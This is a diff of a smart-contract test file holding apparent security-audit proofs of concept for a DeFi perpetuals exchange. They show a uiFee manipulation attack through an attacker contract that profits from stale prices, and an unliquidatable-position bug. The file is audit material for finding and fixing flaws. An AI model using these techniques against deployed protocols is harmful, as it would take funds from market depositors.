@@ -15,11 +15,24 @@ import { getOrderCount } from "../../utils/order";
 import { executeLiquidation } from "../../utils/liquidation";
 import { handleWithdrawal } from "../../utils/withdrawal";
 import { getBalanceOf, getSupplyOf } from "../../utils/token";
+import { createWithdrawal, getWithdrawalKeys, getWithdrawalCount, executeWithdrawal } from "../../utils/withdrawal";
 
-describe.only("Guardian.PoCs", () => {
+describe("Guardian.PoCs", () => {
   let fixture;
   let wallet, user0, user1, user2, user3, reader;
-  let roleStore, dataStore, ethUsdMarket, wnt, usdc, ethUsdSingleTokenMarket, referralStorage, exchangeRouter, errors;
+  let roleStore,
+    dataStore,
+    wbtc,
+    ethUsdMarket,
+    oracle,
+    wnt,
+    usdc,
+    btcUsdMarket,
+    ethUsdSingleTokenMarket,
+    referralStorage,
+    exchangeRouter,
+    errors,
+    attackContract;
 
   beforeEach(async () => {
     fixture = await deployFixture();
@@ -28,82 +41,185 @@ describe.only("Guardian.PoCs", () => {
       roleStore,
       dataStore,
       ethUsdMarket,
+      oracle,
+      wbtc,
       wnt,
       usdc,
       ethUsdSingleTokenMarket,
       reader,
       referralStorage,
       exchangeRouter,
+      btcUsdMarket,
       errors,
+      attackContract,
     } = fixture.contracts);
-  });
 
-  it("DPCU-1 CRITICAL: Unliquidatable position due to unaccounted pnlAmountForPool", async () => {
     await handleDeposit(fixture, {
       create: {
+        account: user0,
+        market: btcUsdMarket,
+        longTokenAmount: expandDecimals(100, 18),
+        shortTokenAmount: expandDecimals(50_000 * 100, 6),
+      },
+      execute: {
+        tokens: [wbtc.address, usdc.address],
+        minPrices: [expandDecimals(50_000, 4), expandDecimals(1, 6)],
+        maxPrices: [expandDecimals(50_000, 4), expandDecimals(1, 6)],
+        precisions: [8, 18],
+      },
+    });
+  });
+
+  it.only("uiFee Manipulation", async function () {
+    const USER_1_DEPOSIT_AMOUNT_LONG = expandDecimals(1_000, 18);
+    const USER_1_DEPOSIT_AMOUNT_SHORT = expandDecimals(5_000_000, 6);
+
+    await dataStore.setUint(keys.MAX_UI_FEE_FACTOR, decimalToFloat(5, 5)); // Half a BIP
+
+    // Notice that the target price could also come from some oracle or DEX quote
+    // This way outdated prices can be automatically taken advantage of at the detriment of
+    // market depositors
+    await attackContract.configure(exchangeRouter.address, oracle.address, wnt.address, 5000000000000000);
+
+    // User 1 deposits into the market
+    await handleDeposit(fixture, {
+      create: {
+        account: user1,
         market: ethUsdMarket,
-        longTokenAmount: expandDecimals(1000, 18),
-        shortTokenAmount: expandDecimals(1000, 9),
+        longTokenAmount: USER_1_DEPOSIT_AMOUNT_LONG,
+        shortTokenAmount: USER_1_DEPOSIT_AMOUNT_SHORT,
       },
     });
 
-    await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1, 9));
-    await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(1, 9));
-    await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1));
-    await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(2));
+    // User 1 creates a withdrawal with a malicious uiFeeReceiver and receiver address
+    await createWithdrawal(fixture, {
+      account: user1,
+      receiver: attackContract,
+      uiFeeReceiver: attackContract,
+      market: ethUsdMarket,
+      marketTokenAmount: expandDecimals(1000, 18),
+      minLongTokenAmount: 100,
+      minShortTokenAmount: expandDecimals(1, 16),
+      shouldUnwrapNativeToken: true,
+      shortTokenSwapPath: [btcUsdMarket.marketToken],
+      gasUsageLabel: "createWithdrawal",
+    });
 
-    // User1 creates a short with size $200,000
+    let withdrawalKeys = await getWithdrawalKeys(dataStore, 0, 1);
+    let withdrawal = await reader.getWithdrawal(dataStore.address, withdrawalKeys[0]);
+
+    expect(withdrawal.addresses.account).eq(user1.address);
+    expect(await getWithdrawalCount(dataStore)).eq(1);
+
+    // Attacker Contract observes that the price of ether provided in the withdrawal execution does not offer
+    // any sort of risk free profit and so automatically gets the withdrawal cancelled without any necessary front-running.
+    //
+    // Notice that the minShortTokenAmount is independant from the price of the long token or the longTokenSwapPath
+    // this enables a user to take advantage of advantageous prices with the longTokenSwapPath, meanwhile the conditions
+    // for a withdrawal cancellation are not dependent on those prices.
+    //
+    // In this example we assume BTC-USD remains at a similar price, however the shortTokenSwapPath could use even
+    // more stable pairs -- where even small deviations in the output amount created by the uiFee can reliably cause a revert.
+    //
+    // Additionally, note that with longer swapPaths the uiFee compounds and it will be much easier to reliably cause
+    // a withdrawal (or order) to fail when desired.
+    await executeWithdrawal(fixture, {
+      tokens: [wbtc.address, usdc.address, wnt.address],
+      minPrices: [expandDecimals(50_000, 4), expandDecimals(1, 6), expandDecimals(4_999, 4)],
+      maxPrices: [expandDecimals(50_000, 4), expandDecimals(1, 6), expandDecimals(4_999, 4)],
+      precisions: [8, 18, 8],
+      expectedCancellationReason: "InsufficientSwapOutputAmount",
+    });
+
+    withdrawal = await reader.getWithdrawal(dataStore.address, withdrawalKeys[0]);
+    expect(await getWithdrawalCount(dataStore)).eq(0);
+
+    // User 1 creates another withdrawal with a malicious uiFeeReceiver and receiver address
+    // hoping to get risk free profit
+    await createWithdrawal(fixture, {
+      account: user1,
+      receiver: attackContract,
+      uiFeeReceiver: attackContract,
+      market: ethUsdMarket,
+      marketTokenAmount: expandDecimals(1000, 18),
+      minLongTokenAmount: 100,
+      minShortTokenAmount: expandDecimals(1, 16),
+      shouldUnwrapNativeToken: true,
+      shortTokenSwapPath: [btcUsdMarket.marketToken],
+      gasUsageLabel: "createWithdrawal",
+    });
+
+    withdrawalKeys = await getWithdrawalKeys(dataStore, 0, 1);
+    withdrawal = await reader.getWithdrawal(dataStore.address, withdrawalKeys[0]);
+
+    expect(withdrawal.addresses.account).eq(user1.address);
+    expect(await getWithdrawalCount(dataStore)).eq(1);
+
+    // Now the price of ether is able to be taken advantage of and the attacker can leverage this in
+    // a longTokenSwapPath to make risk free profit.
+    await executeWithdrawal(fixture, {
+      tokens: [wbtc.address, usdc.address, wnt.address],
+      minPrices: [expandDecimals(50_000, 4), expandDecimals(1, 6), expandDecimals(5_001, 4)],
+      maxPrices: [expandDecimals(50_000, 4), expandDecimals(1, 6), expandDecimals(5_001, 4)],
+      precisions: [8, 18, 8],
+    });
+
+    withdrawal = await reader.getWithdrawal(dataStore.address, withdrawalKeys[0]);
+    expect(await getWithdrawalCount(dataStore)).eq(0);
+  });
+
+  it("Unliquidatable position due to unaccounted pnlAmountForPool", async function () {
+    await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1, 7));
+    await dataStore.setUint(keys.borrowingFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(2, 7));
+    await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, true), decimalToFloat(1));
+    await dataStore.setUint(keys.borrowingExponentFactorKey(ethUsdMarket.marketToken, false), decimalToFloat(1));
+    const USER_1_DEPOSIT_AMOUNT_LONG = expandDecimals(1_000, 18);
+    const USER_1_DEPOSIT_AMOUNT_SHORT = expandDecimals(5_000_000, 6);
+
+    // User 1 deposits into the market
+    await handleDeposit(fixture, {
+      create: {
+        account: user1,
+        market: ethUsdMarket,
+        longTokenAmount: USER_1_DEPOSIT_AMOUNT_LONG,
+        shortTokenAmount: USER_1_DEPOSIT_AMOUNT_SHORT,
+      },
+    });
+
+    // Trader opens a position, pnlToken != collateralToken
     await handleOrder(fixture, {
       create: {
         account: user1,
         market: ethUsdMarket,
-        initialCollateralToken: wnt,
-        initialCollateralDeltaAmount: expandDecimals(10, 18),
-        sizeDeltaUsd: decimalToFloat(200 * 1000),
-        acceptablePrice: expandDecimals(5000, 12),
+        initialCollateralToken: usdc,
+        initialCollateralDeltaAmount: expandDecimals(10 * 1000, 6), // $10,000
+        swapPath: [],
+        sizeDeltaUsd: decimalToFloat(500_000),
+        acceptablePrice: expandDecimals(5010, 12),
+        executionFee: expandDecimals(1, 15),
+        minOutputAmount: 0,
         orderType: OrderType.MarketIncrease,
-        isLong: false,
+        isLong: true,
+        shouldUnwrapNativeToken: false,
       },
     });
 
-    expect(await getAccountPositionCount(dataStore, user1.address)).eq(1);
-    expect(await getOrderCount(dataStore)).eq(0);
+    expect(await getPositionCount(dataStore)).to.eq(1);
 
-    await dataStore.setUint(keys.MIN_COLLATERAL_USD, decimalToFloat(200_000)); // Position is liquidatable
-    await dataStore.setUint(keys.positionFeeFactorKey(ethUsdMarket.marketToken), decimalToFloat(5, 10));
-    await dataStore.setUint(keys.POSITION_FEE_RECEIVER_FACTOR, decimalToFloat(1, 0));
+    // Build up a bunch of fees to make the position liquidatable even when in profit
+    await time.increase(17000 * 24 * 60 * 60);
 
-    await time.increase(14 * 24 * 60 * 60);
-
-    // The position is unable to be liquidated as the values.pnlAmountForPool
-    // is overwritten in getLiquidationValues. Therefore the amount that goes into
-    // the swapProfitToCollateralToken is never decremented from the poolAmount.
-    // The solution is to add the following before resetting the values.pnlAmountForPool:
-    //    if (values.pnlTokenForPool != params.position.collateralToken()) {
-    //                MarketUtils.applyDeltaToPoolAmount(
-    //                    params.contracts.dataStore,
-    //                    params.contracts.eventEmitter,
-    //                    params.market.marketToken,
-    //                    values.pnlTokenForPool,
-    //                    values.pnlAmountForPool
-    //                );
-    //                values.pnlTokenForPool = params.position.collateralToken();
-    //    }
-    //
-    //    (`values.pnlTokenForPool = params.position.collateralToken()` can be moved in the if to save gas)
+    // Execute the liquidation and see what happens
     await expect(
       executeLiquidation(fixture, {
         account: user1.address,
         market: ethUsdMarket,
-        collateralToken: wnt,
-        isLong: false,
-        minPrices: [expandDecimals(4600, 4), expandDecimals(1, 6)],
-        maxPrices: [expandDecimals(4600, 4), expandDecimals(1, 6)],
+        collateralToken: usdc,
+        isLong: true,
+        minPrices: [expandDecimals(5010, 4), expandDecimals(1, 6)],
+        maxPrices: [expandDecimals(5010, 4), expandDecimals(1, 6)],
       })
     ).to.be.revertedWithCustomError(errors, "InvalidMarketTokenBalance");
-
-    expect(await getAccountPositionCount(dataStore, user1.address)).eq(1);
-    expect(await getOrderCount(dataStore)).eq(0);
   });
 
   it("MKTU-1 HIGH: Malicious Actor Can Brick Markets", async function () {
